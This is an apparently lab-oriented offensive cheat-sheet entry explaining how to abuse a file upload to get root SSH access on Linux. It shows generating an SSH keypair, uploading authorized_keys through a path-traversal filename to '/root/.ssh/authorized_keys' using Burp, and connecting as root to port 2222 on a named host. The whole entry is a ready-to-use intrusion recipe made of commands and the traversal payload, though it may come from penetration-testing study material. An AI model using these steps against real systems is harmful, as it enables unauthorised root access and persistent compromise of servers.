---
title: File Upload Abuse - SSH authorized_keys
category: initial-access
subcategory: web-attacks
os: linux
command: ssh-keygen
tools: ssh-keygen, burp, ssh
---


### 1. Generate keypair on attacker

```bash
ssh-keygen
cat NAZWAPLIKUKEYGEN.pub > authorized_keys
```

### 2. Upload via path traversal in Burp

```
../../../../../../../root/.ssh/authorized_keys
```

### 3. Connect

```bash
rm ~/.ssh/known_hosts
ssh -p 2222 -i fileup root@mountaindesserts.com
```
